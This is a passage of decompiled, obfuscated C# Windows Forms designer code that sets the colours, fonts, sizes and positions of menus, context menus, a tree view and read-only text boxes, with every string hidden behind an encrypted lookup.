			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0006().Font = new Font(global::\u0006\u2001.\u0002(-1829139509), 8.25f, FontStyle.Bold);
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0006().ForeColor = Color.LightSteelBlue;
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0006().Image = (Image)componentResourceManager.GetObject(global::\u0006\u2001.\u0002(-1829122267));
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0006().Name = global::\u0006\u2001.\u0002(-1829122273);
			ToolStripItem toolStripItem6 = this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0006();
			size = new Size(131, 22);
			toolStripItem6.Size = size;
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0006().Text = global::\u0006\u2001.\u0002(-1829123113);
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u000E().BackColor = Color.Black;
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u000E().Font = new Font(global::\u0006\u2001.\u0002(-1829139509), 8.25f, FontStyle.Bold);
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u000E().ForeColor = Color.LightSteelBlue;
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u000E().Image = (Image)componentResourceManager.GetObject(global::\u0006\u2001.\u0002(-1829122177));
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u000E().Name = global::\u0006\u2001.\u0002(-1829122211);
			ToolStripItem toolStripItem7 = this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u000E();
			size = new Size(131, 22);
			toolStripItem7.Size = size;
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u000E().Text = global::\u0006\u2001.\u0002(-1829122143);
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u000F().BackColor = Color.Black;
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u000F().Font = new Font(global::\u0006\u2001.\u0002(-1829139509), 8.25f, FontStyle.Bold);
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u000F().ForeColor = Color.LightSteelBlue;
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u000F().Image = (Image)componentResourceManager.GetObject(global::\u0006\u2001.\u0002(-1829122122));
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u000F().Name = global::\u0006\u2001.\u0002(-1829122160);
			ToolStripItem toolStripItem8 = this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u000F();
			size = new Size(131, 22);
			toolStripItem8.Size = size;
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u000F().Text = global::\u0006\u2001.\u0002(-1829122064);
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0002\u2000().BackColor = Color.Black;
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0002\u2000().Font = new Font(global::\u0006\u2001.\u0002(-1829139509), 8.25f, FontStyle.Bold);
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0002\u2000().ForeColor = Color.LightSteelBlue;
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0002\u2000().Image = (Image)componentResourceManager.GetObject(global::\u0006\u2001.\u0002(-1829122112));
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0002\u2000().Name = global::\u0006\u2001.\u0002(-1829122501);
			ToolStripItem toolStripItem9 = this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0002\u2000();
			size = new Size(131, 22);
			toolStripItem9.Size = size;
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0002\u2000().Text = global::\u0006\u2001.\u0002(-1829122532);
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0002().ImageStream = (ImageListStreamer)componentResourceManager.GetObject(global::\u0006\u2001.\u0002(-1829122449));
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0002().TransparentColor = Color.Transparent;
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0002().Images.SetKeyName(0, global::\u0006\u2001.\u0002(-1829122440));
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0002().Images.SetKeyName(1, global::\u0006\u2001.\u0002(-1829122489));
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0002().Images.SetKeyName(2, global::\u0006\u2001.\u0002(-1829122474));
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0002().BackColor = Color.Black;
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0002().ContextMenuStrip = this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0008();
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0002().Dock = DockStyle.Left;
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0002().Font = new Font(global::\u0006\u2001.\u0002(-1829139509), 8.25f, FontStyle.Bold);
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0002().ForeColor = Color.LightSteelBlue;
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0002().ImageIndex = 0;
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0002().ImageList = this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0002();
			Control control10 = this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0002();
			location = new Point(0, 0);
			control10.Location = location;
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0002().Name = global::\u0006\u2001.\u0002(-1829122395);
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0002().SelectedImageIndex = 0;
			Control control11 = this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0002();
			size = new Size(200, 238);
			control11.Size = size;
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0002().TabIndex = 0;
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0008().Items.AddRange(new ToolStripItem[]
			{
				this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0003\u2000(),
				this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0005\u2000(),
				this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0008\u2000()
			});
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0008().Name = global::\u0006\u2001.\u0002(-1829122373);
			Control control12 = this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0008();
			size = new Size(161, 70);
			control12.Size = size;
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0003\u2000().BackColor = Color.Black;
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0003\u2000().Font = new Font(global::\u0006\u2001.\u0002(-1829139509), 8.25f, FontStyle.Bold);
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0003\u2000().ForeColor = Color.LightSteelBlue;
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0003\u2000().Image = (Image)componentResourceManager.GetObject(global::\u0006\u2001.\u0002(-1829122384));
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0003\u2000().Name = global::\u0006\u2001.\u0002(-1829122326);
			ToolStripItem toolStripItem10 = this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0003\u2000();
			size = new Size(160, 22);
			toolStripItem10.Size = size;
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0003\u2000().Text = global::\u0006\u2001.\u0002(-1829123113);
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0005\u2000().BackColor = Color.Black;
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0005\u2000().Font = new Font(global::\u0006\u2001.\u0002(-1829139509), 8.25f, FontStyle.Bold);
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0005\u2000().ForeColor = Color.LightSteelBlue;
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0005\u2000().Image = (Image)componentResourceManager.GetObject(global::\u0006\u2001.\u0002(-1829122358));
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0005\u2000().Name = global::\u0006\u2001.\u0002(-1829122781);
			ToolStripItem toolStripItem11 = this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0005\u2000();
			size = new Size(160, 22);
			toolStripItem11.Size = size;
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0005\u2000().Text = global::\u0006\u2001.\u0002(-1829122814);
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0008\u2000().BackColor = Color.Black;
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0008\u2000().Font = new Font(global::\u0006\u2001.\u0002(-1829139509), 8.25f, FontStyle.Bold);
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0008\u2000().ForeColor = Color.LightSteelBlue;
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0008\u2000().Image = (Image)componentResourceManager.GetObject(global::\u0006\u2001.\u0002(-1829122799));
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0008\u2000().Name = global::\u0006\u2001.\u0002(-1829122742);
			ToolStripItem toolStripItem12 = this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0008\u2000();
			size = new Size(160, 22);
			toolStripItem12.Size = size;
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0008\u2000().Text = global::\u0006\u2001.\u0002(-1829122647);
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u000F().BackColor = Color.White;
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u000F().Font = new Font(global::\u0006\u2001.\u0002(-1829139509), 8.25f, FontStyle.Bold);
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u000F().Items.AddRange(new ToolStripItem[]
			{
				this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0003\u2003(),
				this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0005\u2003(),
				this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0008\u2003()
			});
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u000F().Name = global::\u0006\u2001.\u0002(-1829141617);
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u000F().RenderMode = ToolStripRenderMode.Professional;
			Control control13 = this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u000F();
			size = new Size(109, 70);
			control13.Size = size;
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0003\u2003().BackColor = Color.Black;
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0003\u2003().Font = new Font(global::\u0006\u2001.\u0002(-1829139509), 8.25f, FontStyle.Bold);
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0003\u2003().ForeColor = Color.LightSteelBlue;
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0003\u2003().Image = (Image)componentResourceManager.GetObject(global::\u0006\u2001.\u0002(-1829122637));
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0003\u2003().Name = global::\u0006\u2001.\u0002(-1829122668);
			ToolStripItem toolStripItem13 = this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0003\u2003();
			size = new Size(108, 22);
			toolStripItem13.Size = size;
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0003\u2003().Text = global::\u0006\u2001.\u0002(-1829138787);
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0005\u2003().BackColor = Color.Black;
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0005\u2003().Font = new Font(global::\u0006\u2001.\u0002(-1829139509), 8.25f, FontStyle.Bold);
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0005\u2003().ForeColor = Color.LightSteelBlue;
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0005\u2003().Image = (Image)componentResourceManager.GetObject(global::\u0006\u2001.\u0002(-1829122565));
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0005\u2003().Name = global::\u0006\u2001.\u0002(-1829122596);
			ToolStripItem toolStripItem14 = this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0005\u2003();
			size = new Size(108, 22);
			toolStripItem14.Size = size;
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0005\u2003().Text = global::\u0006\u2001.\u0002(-1829123037);
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0008\u2003().BackColor = Color.Black;
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0008\u2003().Font = new Font(global::\u0006\u2001.\u0002(-1829139509), 8.25f, FontStyle.Bold);
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0008\u2003().ForeColor = Color.LightSteelBlue;
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0008\u2003().Image = (Image)componentResourceManager.GetObject(global::\u0006\u2001.\u0002(-1829123017));
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0008\u2003().Name = global::\u0006\u2001.\u0002(-1829123048);
			ToolStripItem toolStripItem15 = this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0008\u2003();
			size = new Size(108, 22);
			toolStripItem15.Size = size;
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0008\u2003().Text = global::\u0006\u2001.\u0002(-1829138894);
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0003().Controls.Add(this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0002());
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0003().Controls.Add(this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0002());
			Control control14 = this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0003();
			location = new Point(565, 218);
			control14.Location = location;
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0003().Name = global::\u0006\u2001.\u0002(-1829122945);
			Control control15 = this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0003();
			size = new Size(384, 213);
			control15.Size = size;
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0003().TabIndex = 7;
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0002().BackColor = Color.Black;
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0002().BorderStyle = BorderStyle.None;
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0002().Cursor = Cursors.Arrow;
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0002().Dock = DockStyle.Fill;
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0002().Font = new Font(global::\u0006\u2001.\u0002(-1829139509), 8.25f, FontStyle.Bold);
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0002().ForeColor = Color.LightSteelBlue;
			Control control16 = this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0002();
			location = new Point(0, 0);
			control16.Location = location;
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0002().Name = global::\u0006\u2001.\u0002(-1829140062);
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0002().ReadOnly = true;
			Control control17 = this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0002();
			size = new Size(384, 193);
			control17.Size = size;
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0002().TabIndex = 1;
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0002().Text = string.Empty;
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0002().BackColor = Color.Gray;
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0002().BorderStyle = BorderStyle.FixedSingle;
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0002().Dock = DockStyle.Bottom;
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0002().Font = new Font(global::\u0006\u2001.\u0002(-1829139509), 8.25f, FontStyle.Bold);
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0002().ForeColor = Color.LightSteelBlue;
			Control control18 = this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0002();
			location = new Point(0, 193);
			control18.Location = location;
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0002().Name = global::\u0006\u2001.\u0002(-1829138738);
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0002().ReadOnly = true;
			Control control19 = this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0002();
			size = new Size(384, 20);
			control19.Size = size;
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0002().TabIndex = 0;
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0005().Controls.Add(this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0005());
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0005().Controls.Add(this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0002());
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0005().Controls.Add(this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0003());
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0005().Controls.Add(this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0008());
			Control control20 = this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0005();
			location = new Point(481, 281);
			control20.Location = location;
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0005().Name = global::\u0006\u2001.\u0002(-1829122954);
			Control control21 = this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0005();
			size = new Size(49, 42);
			control21.Size = size;
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0005().TabIndex = 8;
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u000E().BackColor = Color.White;
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u000E().Font = new Font(global::\u0006\u2001.\u0002(-1829139509), 8.25f, FontStyle.Bold);
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u000E().Items.AddRange(new ToolStripItem[]
			{
				this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u000E\u2000(),
				this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u000F\u2000(),
				this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0002\u2001(),
				this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0003\u2001(),
				this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0005\u2001(),
				this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0008\u2001(),
				this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0006\u2001(),
				this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u000E\u2001(),
				this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u000F\u2001(),
				this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0002\u2002(),
				this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0003\u2002(),
				this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0005\u2002(),
				this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0008\u2002(),
				this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0006\u2002(),
				this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u000E\u2002(),
				this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u000F\u2002(),
				this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0002\u2003()
			});
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u000E().Name = global::\u0006\u2001.\u0002(-1829141617);
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u000E().RenderMode = ToolStripRenderMode.Professional;
			Control control22 = this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u000E();
			size = new Size(171, 378);
			control22.Size = size;
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u000E\u2000().BackColor = Color.Black;
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u000E\u2000().Font = new Font(global::\u0006\u2001.\u0002(-1829139509), 8.25f, FontStyle.Bold);
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u000E\u2000().ForeColor = Color.LightSteelBlue;
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u000E\u2000().Image = (Image)componentResourceManager.GetObject(global::\u0006\u2001.\u0002(-1829122996));
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u000E\u2000().Name = global::\u0006\u2001.\u0002(-1829122900);
			ToolStripItem toolStripItem16 = this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u000E\u2000();
			size = new Size(170, 22);
			toolStripItem16.Size = size;
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u000E\u2000().Text = global::\u0006\u2001.\u0002(-1829122894);
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u000F\u2000().BackColor = Color.Black;
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u000F\u2000().Font = new Font(global::\u0006\u2001.\u0002(-1829139509), 8.25f, FontStyle.Bold);
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u000F\u2000().ForeColor = Color.LightSteelBlue;
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u000F\u2000().Image = (Image)componentResourceManager.GetObject(global::\u0006\u2001.\u0002(-1829142477));
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u000F\u2000().Name = global::\u0006\u2001.\u0002(-1829142508);
			ToolStripItem toolStripItem17 = this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u000F\u2000();
			size = new Size(170, 22);
			toolStripItem17.Size = size;
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u000F\u2000().Text = global::\u0006\u2001.\u0002(-1829123113);
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0002\u2001().BackColor = Color.Black;
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0002\u2001().Font = new Font(global::\u0006\u2001.\u0002(-1829139509), 8.25f, FontStyle.Bold);
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0002\u2001().ForeColor = Color.LightSteelBlue;
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0002\u2001().Image = (Image)componentResourceManager.GetObject(global::\u0006\u2001.\u0002(-1829122935));
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0002\u2001().Name = global::\u0006\u2001.\u0002(-1829122840);
			ToolStripItem toolStripItem18 = this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0002\u2001();
			size = new Size(170, 22);
			toolStripItem18.Size = size;
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0002\u2001().Text = global::\u0006\u2001.\u0002(-1829122867);
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0003\u2001().BackColor = Color.Black;
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0003\u2001().Font = new Font(global::\u0006\u2001.\u0002(-1829139509), 8.25f, FontStyle.Bold);
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0003\u2001().ForeColor = Color.LightSteelBlue;
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0003\u2001().Image = (Image)componentResourceManager.GetObject(global::\u0006\u2001.\u0002(-1829122877));
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0003\u2001().Name = global::\u0006\u2001.\u0002(-1829125313);
			ToolStripItem toolStripItem19 = this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0003\u2001();
			size = new Size(170, 22);
			toolStripItem19.Size = size;
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0003\u2001().Text = global::\u0006\u2001.\u0002(-1829122532);
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0005\u2001().BackColor = Color.Black;
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0005\u2001().Font = new Font(global::\u0006\u2001.\u0002(-1829139509), 8.25f, FontStyle.Bold);
